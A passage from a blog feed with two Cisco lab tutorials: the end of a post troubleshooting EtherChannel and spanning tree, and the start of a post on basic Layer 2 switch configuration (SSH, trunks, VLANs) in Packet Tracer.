Group  Port-channel  Protocol    Ports
------|-------------|-----------|----------------------------------------------

<span style="color:#3677a9">1</span>      Po1(SU)           -      Fa0/4(P) Fa0/2(P) 
<span style="color:#3677a9">2</span>      Po2(SD)           -      
</code></pre></div><p>As you can see there is a port-channel <code>Po1</code> consisting of <code>Fa0/2</code> and <code>Fa0/4</code>. The port.channel is also working and in use.</p>
<ul>
<li><code>SW3</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3#sh eth sum
Flags:  D - down        P - in port-channel
        I - stand-alone s - suspended
        H - Hot-standby (LACP only)
        R - Layer3      S - Layer2
        U - in use      f - failed to allocate aggregator
        u - unsuitable <span style="color:#6ab825;font-weight:bold">for</span> bundling
        w - waiting to be aggregated
        d - default port


Number of channel-groups in use: <span style="color:#3677a9">2</span>
Number of aggregators:           <span style="color:#3677a9">2</span>

Group  Port-channel  Protocol    Ports
------|-------------|-----------|----------------------------------------------

<span style="color:#3677a9">1</span>      Po1(SD)           -      
<span style="color:#3677a9">2</span>      Po2(SU)           -      Fa0/4(P) Fa0/5(P) 
</code></pre></div><p>Again <code>Po2</code> is a working port-channel and consists of <code>Fa0/4</code> and <code>Fa0/5</code>.
You also should have noticed that the ports on each switch belong to different channel groups. You can now treat <code>Po1</code> and <code>Po2</code> as interfaces, bring them up or down. If your port-channel is down, do following:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4(config)<span style="color:#999;font-style:italic">#int Po1</span>
SW4(config-if)<span style="color:#999;font-style:italic">#no shutdown </span>
</code></pre></div><p>You can also add <strong>VLANs</strong> to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4(config-if)<span style="color:#999;font-style:italic">#switchport mode trunk</span>
SW4(config-if)<span style="color:#999;font-style:italic">#switchport trunk allowed vlan 10,20,30</span>
</code></pre></div><p>Afterwards you should be able to verify that:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4#sh int trunk
Port        Mode         Encapsulation  Status        Native vlan
Fa0/1       on           802.1q         trunking      <span style="color:#3677a9">1</span>
Fa0/3       on           802.1q         trunking      <span style="color:#3677a9">1</span>
Po1         on           802.1q         trunking      <span style="color:#3677a9">1</span>

Port        Vlans allowed on trunk
Fa0/1       10,20,30
Fa0/3       10,20,30
Po1         10,20,30

Port        Vlans allowed and active in management domain
Fa0/1       10,20,30
Fa0/3       10,20,30
Po1         10,20,30

Port        Vlans in spanning tree forwarding state and not pruned
Fa0/1       10,20,30
Fa0/3       10,20,30
Po1         10,20,30
</code></pre></div><h2 id="troubleshooting">Troubleshooting</h2>
<p>Although this is not a complex topology, adding STP to your switches, might increase the troubleshooting steps needed to localize your problem. In my particular case I was able to ping from <code>PC3</code> to <code>PC6</code>, however <code>PC1</code> wasn&rsquo;t able to reach <code>PC5</code>. After eliminating a list of might-be problems like:</p>
<ul>
<li>port security</li>
<li>misconfigured trunk ports</li>
<li>wrong VLANs</li>
<li>missing IP addresses</li>
</ul>
<p>I was able to nail down the problem using STP related information. Furthermore it turned out that the <strong>EtherChannel</strong> was not working at all, causing certain frames to be dropped without reaching their final destination. So how might one <em>guess</em> how data would be routed based on output from the <code>show</code> commands?</p>
<p>Let&rsquo;s suppose <code>PC1</code> (10.10.10.101) cannot reach <code>PC5</code> (10.10.10.105). Also keep in mind that both hosts belong to the same <strong>VLAN</strong> (10 = Students). Our simplified topology would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%dot
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;â†”</span>

     SW1 -- SW2 [<span style="color:#24909d">dir</span>=both, label = <span style="color:#ed9d13">&#34;Fa0/1 - Fa0/1&#34;</span>, arrowhead=normal];
     SW2 -- SW3 [<span style="color:#24909d">dir</span>=both, label = <span style="color:#ed9d13">&#34;Fa0/2 - Fa0/1&#34;</span>, arrowhead=normal];

     SW4 -- SW1 [<span style="color:#24909d">dir</span>=both, label = <span style="color:#ed9d13">&#34;Fa0/4 - Fa0/1&#34;</span>];
     SW4 -- SW2 [<span style="color:#24909d">dir</span>=both,label = <span style="color:#ed9d13">&#34;Fa0/3 - Fa0/5&#34;</span>];
     SW4 -- SW3 [<span style="color:#24909d">dir</span>=both,label = <span style="color:#ed9d13">&#34;Po1 - Po2&#34;</span>, arrowhead=normal];
    
     PC1 [label = <span style="color:#ed9d13">&#34;PC1 [.101]&#34;</span>];
     PC4 [label = <span style="color:#ed9d13">&#34;PC5 [.105]&#34;</span>];
        
     SW1 -- PC1 [<span style="color:#24909d">dir</span>=both, label = <span style="color:#ed9d13">&#34;Fa0/2 - Fa0&#34;</span>];
     SW3 -- PC4 [<span style="color:#24909d">dir</span>=both, label = <span style="color:#ed9d13">&#34;Fa0/3 - Fa0&#34;</span>];

     {rank = same; SW1; SW2; SW3;}
     {rank = same; PC1; PC4;}
 }
</code></pre></div><p><img src="output_13_0.svg" alt="svg"></p>
<p>There are several way how frames from <code>PC1</code> would reach <code>PC5</code>. However when dealing with <strong>STP</strong> some ports will in be <strong>blocking</strong> state. Let&rsquo;s check that out:</p>
<ul>
<li><code>SW1</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#sh spanning-tree vlan <span style="color:#3677a9">10</span>
VLAN0010
...

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Altn BLK <span style="color:#3677a9">19</span>        128.1    P2p
Fa0/2            Desg FWD <span style="color:#3677a9">19</span>        128.2    P2p
Fa0/3            Desg FWD <span style="color:#3677a9">19</span>        128.3    P2p
Fa0/4            Root FWD <span style="color:#3677a9">19</span>        128.4    P2p
</code></pre></div><ul>
<li><code>SW2</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#sh spanning-tree vlan <span style="color:#3677a9">10</span>
VLAN0010
...

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Desg FWD <span style="color:#3677a9">19</span>        128.1    P2p
Fa0/2            Root FWD <span style="color:#3677a9">19</span>        128.2    P2p
Fa0/5            Altn BLK <span style="color:#3677a9">19</span>        128.5    P2p
Fa0/6            Desg FWD <span style="color:#3677a9">19</span>        128.6    P2p
</code></pre></div><ul>
<li><code>SW3</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3#sh spanning-tree vlan <span style="color:#3677a9">10</span>
...

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Desg FWD <span style="color:#3677a9">19</span>        128.1    P2p
Fa0/3            Desg FWD <span style="color:#3677a9">19</span>        128.3    P2p
Po2              Desg FWD <span style="color:#3677a9">9</span>         128.27   Shr
</code></pre></div><ul>
<li><code>SW4</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4#sh spanning-tree vlan <span style="color:#3677a9">10</span>
...

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Desg FWD <span style="color:#3677a9">19</span>        128.1    P2p
Fa0/3            Desg FWD <span style="color:#3677a9">19</span>        128.3    P2p
Fa0/5            Desg FWD <span style="color:#3677a9">19</span>        128.5    P2p
Po1              Root FWD <span style="color:#3677a9">9</span>         128.27   Shr
</code></pre></div><p>Based of the previous outputs our topology now looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%dot
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;â†”</span>

     SW1 -- SW2 [<span style="color:#24909d">dir</span>=both, arrowtail=box];
     SW2 -- SW3 [<span style="color:#24909d">dir</span>=both, arrowhead=normal];

     SW4 -- SW1 [<span style="color:#24909d">dir</span>=both];
     SW4 -- SW2 [<span style="color:#24909d">dir</span>=both, arrowhead=box];
     SW4 -- SW3 [<span style="color:#24909d">dir</span>=both, arrowhead=normal];
    
     PC1 [label = <span style="color:#ed9d13">&#34;PC1 [.101]&#34;</span>];
     PC4 [label = <span style="color:#ed9d13">&#34;PC5 [.105]&#34;</span>];
        
     SW1 -- PC1 [<span style="color:#24909d">dir</span>=both];
     SW3 -- PC4 [<span style="color:#24909d">dir</span>=both];

     {rank = same; SW1; SW2; SW3;}
     {rank = same; PC1; PC4;}
 }
</code></pre></div><p><img src="output_15_0.svg" alt="svg"></p>
<p>That means:</p>
<ul>
<li><code>SW1</code>s <strong>Fa0/1</strong> port is in <strong>blocking</strong> state (arrow endpoint is a box)</li>
<li><code>SW2</code>s <strong>Fa0/5</strong> port is in <strong>blocking</strong> state (arrow endpoint is a box)</li>
<li>all other ports are in <strong>forwarding</strong> state</li>
</ul>
<p>In this case there is <strong>only</strong> one way <code>PC1</code> could send frames to <code>PC5</code>  (red lines):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%dot
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
 graph mylab {<span style="color:#a61717;background-color:#e3d2d2">â†”</span>

     SW1 -- SW2 [<span style="color:#24909d">dir</span>=both, arrowtail=box];
     SW2 -- SW3 [<span style="color:#24909d">dir</span>=both, arrowhead=normal];

     SW4 -- SW1 [<span style="color:#24909d">dir</span>=both, color=<span style="color:#ed9d13">&#34;red&#34;</span>];
     SW4 -- SW2 [<span style="color:#24909d">dir</span>=both, arrowhead=box];
     SW4 -- SW3 [<span style="color:#24909d">dir</span>=both, arrowhead=normal, color=<span style="color:#ed9d13">&#34;red&#34;</span>];
    
     PC1 [label = <span style="color:#ed9d13">&#34;PC1 [.101]&#34;</span>];
     PC4 [label = <span style="color:#ed9d13">&#34;PC5 [.105]&#34;</span>];
        
     SW1 -- PC1 [<span style="color:#24909d">dir</span>=both, color=<span style="color:#ed9d13">&#34;red&#34;</span>];
     SW3 -- PC4 [<span style="color:#24909d">dir</span>=both, color=<span style="color:#ed9d13">&#34;red&#34;</span>];

     {rank = same; SW1; SW2; SW3;}
     {rank = same; PC1; PC4;}
 }
</code></pre></div><p><img src="output_17_0.svg" alt="svg"></p>
<p>In the next posts I&rsquo;ll deal with <strong>IP routing</strong> on <strong>Layer 3</strong>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Basic Layer 2 Switching using Cisco Packet Tracer</title>
      <link>https://blog.dornea.nu/2015/10/21/basic-layer-2-switching-using-cisco-packet-tracer/</link>
      <pubDate>Wed, 21 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/10/21/basic-layer-2-switching-using-cisco-packet-tracer/</guid>
      <content:encoded><![CDATA[<p>As a pseudo-preparation for my <a href="http://www.cisco.com/web/learning/certifications/associate/ccna/index.html">CCNA</a> exam I wanted to sum up some of the <em>basic</em> configuration steps related to <strong>Cisco</strong> switches. Although I won&rsquo;t handle <em>every</em> topic related to Layer 2, I will assume you have already some network knowledge. The main reason for this post is to show how to setup a <em>really</em> small network infrastructure and <em>configure</em> its components. For my purposes I have used <a href="http://www.packettracernetwork.com">Cisco&rsquo;s Packet Tracer</a> to simulate the network which I highly recommend. I know there is sth like <a href="http://www.gns3.com">GNS3</a> but I didn&rsquo;t have (yet) the time to look at it.</p>
<h2 id="configure-the-switches">Configure the Switches</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%blockdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
diagram admin {
    SW1 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];
    SW2 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];
    SW3 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];

    SW1 &lt;-&gt; SW2;
    SW2 &lt;-&gt; SW3;
}
</code></pre></div><p><img src="/posts/img/2015/basic-layer-2-switching-using-cisco-packet-tracer/output_2_0.png" alt="png"></p>
<p>We&rsquo;ll have 3 switches connected to each other: <strong>SW1</strong>, <strong>SW2</strong> and <strong>SW3</strong>. Each of these switches (<a href="http://www.cisco.com/c/en/us/products/collateral/switches/catalyst-2960-series-switches/prod_bulletin0900aecd80322c22.html">Cisco Catalyst 2960 series</a>) will have one or several <strong>VLANs</strong> assigned. But first let&rsquo;s do some <em>house keeping</em> and configure each switch properly. For every switch I&rsquo;ll do:</p>
<ol>
<li>Restrict access
<ul>
<li>Add local user</li>
<li>Set passwords for user</li>
<li>Restrict console access</li>
</ul>
</li>
<li>Enable SSH v2
<ul>
<li>Allow VTYs to use <strong>only</strong> SSH</li>
</ul>
</li>
<li>Disable autologout functionality</li>
<li>Setup proper console logging</li>
<li>&hellip;</li>
</ol>
<h3 id="basic-switch-configuration">Basic switch configuration</h3>
<ul>
<li>House keeping:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">Switch&gt;enable
Switch#conf t
Enter configuration commands, one per line.  End with CNTL/Z.
Switch(config)<span style="color:#999;font-style:italic">#hostname SW1</span>
SW1(config)<span style="color:#999;font-style:italic">#no ip domain-lookup</span>
SW1(config)<span style="color:#999;font-style:italic">#service password-encryption </span>
SW1(config)<span style="color:#999;font-style:italic">#enable secret admin!</span>
SW1(config)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><ul>
<li>Console settings:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#line console 0</span>
SW1(config-line)<span style="color:#999;font-style:italic">#exec-timeout 0 0</span>
SW1(config-line)<span style="color:#999;font-style:italic">#logging synchronous </span>
SW1(config)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><ul>
<li>Virtual terminal settings:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#line vty 0 15</span>
SW1(config-line)<span style="color:#999;font-style:italic">#exec-timeout 0 0</span>
SW1(config)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><ul>
<li>SSH settings:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#ip domain-name sw1.local</span>
SW1(config)<span style="color:#999;font-style:italic">#crypto key generate rsa</span>
The name <span style="color:#6ab825;font-weight:bold">for</span> the keys will be: SW1.sw1.local
Choose the size of the key modulus in the range of <span style="color:#3677a9">360</span> to <span style="color:#3677a9">2048</span> <span style="color:#6ab825;font-weight:bold">for</span> your
  General Purpose Keys. Choosing a key modulus greater than <span style="color:#3677a9">512</span> may take
  a few minutes.

How many bits in the modulus [512]: <span style="color:#3677a9">2048</span>
% Generating <span style="color:#3677a9">2048</span> bit RSA keys, keys will be non-exportable...[OK]
SW1(config)<span style="color:#999;font-style:italic">#ip ssh version 2</span>
</code></pre></div><ul>
<li>Allow SSH for terminals:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#line vty 0 15</span>
SW1(config-line)<span style="color:#999;font-style:italic">#login local</span>
SW1(config-line)<span style="color:#999;font-style:italic">#transport input ssh</span>
SW1(config-line)<span style="color:#999;font-style:italic">#exit</span>
</code></pre></div><ul>
<li>Add local users:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#username admin password admin!</span>
</code></pre></div><ul>
<li>Check SSH:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#show ssh
%No SSHv2 server connections running.
%No SSHv1 server connections running.
</code></pre></div><p>And now store the configuration by replacing the <strong>startup-config</strong> by the <strong>running-config</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#copy running-config startup-config 
Destination filename [startup-config]? 
Building configuration...
</code></pre></div><p>Now we will apply the same configuration (with slightly different modifications) to <code>SW2</code> and <code>SW3</code>.</p>
<h3 id="configure-ports">Configure ports</h3>
<p>Let&rsquo;s have a look at the next step and how our small network should look like:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%blockdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
diagram admin {
    SW1 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];
    SW2 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];
    SW3 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];

    PC1 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC2 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC3 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC4 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC5 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC6 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];

    SW1 &lt;-&gt; SW2 [label = <span style="color:#ed9d13">&#34;F0/1   -   F0/1&#34;</span>];
    SW2 &lt;-&gt; SW3 [label = <span style="color:#ed9d13">&#34;F0/2   -   F0/1&#34;</span>];
    
    group {
        orientation = portrait;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>;
        SW1 &lt;-&gt; PC1 [label = <span style="color:#ed9d13">&#34;F0/2 - F0&#34;</span>];
        SW1 &lt;-&gt; PC2 [label = <span style="color:#ed9d13">&#34;F0/3 - F0&#34;</span>];
    }
    
    group {
        orientation = portrait;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>;
        SW2 &lt;-&gt; PC3 [label = <span style="color:#ed9d13">&#34;F0/3 - F0&#34;</span>];
        SW2 &lt;-&gt; PC4 [label = <span style="color:#ed9d13">&#34;F0/4 - F0&#34;</span>];
    }
    
    group {
        orientation = portrait;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>;
        SW3 &lt;-&gt; PC5 [label = <span style="color:#ed9d13">&#34;F0/3 - F0&#34;</span>];
        SW3 &lt;-&gt; PC6 [label = <span style="color:#ed9d13">&#34;F0/4 - F0&#34;</span>];
    }
}
</code></pre></div><p><img src="/posts/img/2015/basic-layer-2-switching-using-cisco-packet-tracer/output_5_0.png" alt="png"></p>
<p>Following table shows the links between the switches and the PCs and which <strong>switch ports</strong> are being used:</p>
<table cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th>PC</th>
    <th>SW1</th>
    <th>SW2</th>
    <th>SW3</th>
  </tr>
  <tr>
    <td>PC1</td>
    <td>F0/2</td>
    <td></td>
    <td></td>
  </tr>
    <tr>
    <td>PC2</td>
    <td>F0/3</td>
    <td></td>
    <td></td>  
  </tr>
    <tr>
    <td>PC3</td>
    <td></td>
    <td>F0/3</td>
    <td></td>
  </tr>
   <tr>
    <td>PC4</td>
    <td></td>
    <td>F0/4</td>
    <td></td>
  </tr>
  <tr>
    <td>PC5</td>
    <td></td>
    <td></td>
    <td>F0/3</td>
  </tr>
  <tr>
    <td>PC6</td>
    <td></td>
    <td></td>
    <td>F0/4</td>
  </tr>
</table>
<h3 id="configure-links-between-switches">Configure links between switches</h3>
<p>Now I&rsquo;ll configure the ports on between <code>SW1</code> and <code>SW2</code>:</p>
<ul>
<li>Set duplex and link speed:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#conf t
SW1(config)<span style="color:#999;font-style:italic">#int f0/1</span>
SW1(config-if)<span style="color:#999;font-style:italic">#dupl</span>
SW1(config-if)<span style="color:#999;font-style:italic">#duplex full</span>
SW1(config-if)<span style="color:#999;font-style:italic">#speed 100</span>
SW1(config-if)<span style="color:#999;font-style:italic">#description SW2 connects here</span>
</code></pre></div><ul>
<li>Activate <strong>trunk</strong> mode:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config-if)<span style="color:#999;font-style:italic">#switchport mode trunk</span>
SW1(config-if)<span style="color:#999;font-style:italic">#switchport trunk encapsulation dot1q</span>
SW1(config-if)<span style="color:#999;font-style:italic">#no shhutdown</span>
SW1(config-if)<span style="color:#999;font-style:italic">#end</span>
</code></pre></div><ul>
<li>Check switchport configuration:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#sh int f0/1 switchport
Name: Fa0/1
Switchport: Enabled
Administrative Mode: trunk
Operational Mode: down
Administrative Trunking Encapsulation: dot1q
Operational Trunking Encapsulation: dot1q
Negotiation of Trunking: On
Access Mode VLAN: <span style="color:#3677a9">1</span> (default)
Trunking Native Mode VLAN: <span style="color:#3677a9">1</span> (default)
Voice VLAN: none
...
</code></pre></div><ul>
<li>Check interface configuration:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1#sh int f0/1 
FastEthernet0/1 is down, line protocol is down (disabled)
  Hardware is Lance, address is 0090.211e.2e01 (bia 0090.211e.2e01)
  Description: Sw2 connects here
 BW <span style="color:#3677a9">100000</span> Kbit, DLY <span style="color:#3677a9">1000</span> usec,
     reliability 255/255, txload 1/255, rxload 1/255
  Encapsulation ARPA, loopback not <span style="color:#24909d">set</span>
  Keepalive <span style="color:#24909d">set</span> (<span style="color:#3677a9">10</span> sec)
  Full-duplex, 100Mb/s
  input flow-control is off, output flow-control is off
...
</code></pre></div><p>You should have noticed that the interfaces is currently <strong>down</strong>. This happens due to <strong>encapsulation</strong> misconfiguration between the two switches. After having <code>SW2</code> configured as well you should have:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#sh int f0/1 switchport 
Name: Fa0/1
Switchport: Enabled
Administrative Mode: trunk
Operational Mode: trunk
Administrative Trunking Encapsulation: dot1q
Operational Trunking Encapsulation: dot1q
Negotiation of Trunking: On
Access Mode VLAN: <span style="color:#3677a9">1</span> (default)
Trunking Native Mode VLAN: <span style="color:#3677a9">1</span> (default)
Voice VLAN: none
...

SW2#sh int f0/1
FastEthernet0/1 is up, line protocol is up (connected)
  Hardware is Lance, address is 00d0.58ac.4d01 (bia 00d0.58ac.4d01)
  Description: SW1 connects here
 BW <span style="color:#3677a9">100000</span> Kbit, DLY <span style="color:#3677a9">1000</span> usec,
     reliability 255/255, txload 1/255, rxload 1/255
  Encapsulation ARPA, loopback not <span style="color:#24909d">set</span>
  Keepalive <span style="color:#24909d">set</span> (<span style="color:#3677a9">10</span> sec)
  Full-duplex, 100Mb/s
...

</code></pre></div><p>Now we should have a working <strong>trunk</strong> between <code>SW1</code> and <code>SW2</code>. The link between <code>Sw2</code> and <code>Sw3</code> should be then configured as well.</p>
<h3 id="add-vlans">Add VLANs</h3>
<p>Now I&rsquo;ll create 2 VLANs:</p>
<ul>
<li>VLAN <strong>Students</strong>
<ul>
<li>ID: 10</li>
<li>Network address: <code>10.10.10.0/24</code></li>
<li>Hosts: <code>PC1</code>, <code>PC2</code>, <code>PC5</code></li>
</ul>
</li>
<li>VLAN <strong>Teachers</strong>
<ul>
<li>ID: 20</li>
<li>Network address: <code>20.20.20.0/24</code></li>
<li>Hosts: <code>PC3</code>, <code>PC4</code>, <code>PC6</code></li>
</ul>
</li>
</ul>
<p>Additionally every host PC gets following IP addresss:</p>
<table cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th>Host</th>
    <th>IP</th>
    <th>VLAN</th>
  </tr>
  <tr>
    <td>PC1</td>
    <td>10.10.10.101</td>
    <td>Students</td>
  </tr>
  <tr>
    <td>PC2</td>
    <td>10.10.10.102</td>
    <td>Students</td>
  </tr>
  <tr>
    <td>PC3</td>
    <td>20.20.20.103</td>
    <td>Teachers</td>
  </tr>
  <tr>
    <td>PC4</td>
    <td>20.20.20.104</td>
    <td>Teachers</td>
  </tr>
  <tr>
    <td>PC5</td>
    <td>10.10.10.105</td>
    <td>Students</td>
  </tr>
  <tr>
    <td>PC6</td>
    <td>20.20.20.106</td>
    <td>Teachers</td>
  </tr>
</table>
<p>Now let&rsquo;s have a look at our topology:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%blockdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
diagram admin {
    SW1 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];
    SW2 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];
    SW3 [shape = <span style="color:#ed9d13">&#34;cisco.layer_2_remote_switch&#34;</span>];

    PC1 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC2 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC3 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC4 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC5 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC6 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];

    SW1 &lt;-&gt; SW2;
    SW2 &lt;-&gt; SW3;
    
    group {
        orientation = portrait;
        label = <span style="color:#ed9d13">&#34;VLAN 10&#34;</span>;
        color = <span style="color:#ed9d13">&#34;#FFF000&#34;</span>;
        SW1 &lt;-&gt; PC1;
        SW1 &lt;-&gt; PC2;
    }
    
    group {
        orientation = portrait;
        label = <span style="color:#ed9d13">&#34;VLAN 20&#34;</span>;
        color = <span style="color:#ed9d13">&#34;#FFFEEE&#34;</span>;
        SW2 &lt;-&gt; PC3;
        SW2 &lt;-&gt; PC4;
    }
    
    group {
        orientation = portrait;
        label = <span style="color:#ed9d13">&#34;VLAN 10 + VLAN 20&#34;</span>;
        color = <span style="color:#ed9d13">&#34;#FFFDDD&#34;</span>;
        SW3 &lt;-&gt; PC5;
        SW3 &lt;-&gt; PC6;
    }
}
</code></pre></div><p><img src="/posts/img/2015/basic-layer-2-switching-using-cisco-packet-tracer/output_7_0.png" alt="png"></p>
<p><strong>Keep in mind that the switches don&rsquo;t really belong to any VLANs at all.</strong></p>
<h3 id="add-vlan-students">Add VLAN Students</h3>
<p>Adding the VLAN configuration has to be done on every switch. I could have used <code>VTP</code> (VLAN Trunking Protocol) but for the sake of exercise I&rsquo;ll do it manually, beginning with <code>SW1</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#vlan 10</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#name Students</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#exit</span>
SW1(config)<span style="color:#999;font-style:italic">#int range f0/2 - 3</span>
SW1(config-if-range)<span style="color:#999;font-style:italic">#switchport mode access </span>
SW1(config-if-range)<span style="color:#999;font-style:italic">#switchport access vlan 10</span>
